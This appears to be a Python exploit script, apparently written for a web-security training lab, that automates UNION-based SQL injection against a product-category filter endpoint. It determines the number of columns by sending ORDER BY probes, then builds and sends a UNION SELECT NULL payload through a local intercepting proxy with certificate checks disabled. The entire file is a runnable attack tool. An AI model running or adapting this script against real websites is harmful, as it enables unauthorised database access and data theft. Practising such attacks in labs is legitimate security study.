import requests
import urllib3
import sys
#from bs4 import BeautifulSoup

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def determine_columns_number(url):
    print("(+) Determining the number of columns ...")
    counter = 1
    while True:
        base_url  = url + f"' order by {counter} --"
        response = requests.get(base_url, verify=False, proxies=proxies)
        if response.status_code != 200:
            print(f"(+) Number of columns = {counter -1}") # breaks the loop when raising error so the last number should be - 1
            return counter -1
        counter +=1




def exploit_sqli(url):
    print("(+) Exploitation Starts !!")
    uri = "/filter?category=Accessories"
    number_of_clumns = determine_columns_number(url+uri)
    payload = url + uri +"' UNION SELECT "

    while number_of_clumns > 0:
        number_of_clumns -=1
        payload += "NULL , "
    payload = payload[0:len(payload)-2]
    print(f"(+) Final payload is {payload}")
    payload += " --"
    response = requests.get(payload,verify=False,proxies=proxies)
    if response.status_code == 200 :
        print("(+) Exploitation Done Successfully...")
    else:
        print("(-) Exploitation Failed :'( ")






if __name__ == "__main__":
    try:
        url = sys.argv[1]

        exploit_sqli(url)
    except RuntimeError:
        print(RuntimeError)
        print("(-) Usage: %s <url>" %sys.argv[0])
        print("(-) Example: %s https://www.example.com  " %sys.argv[0])
        sys.exit(-1)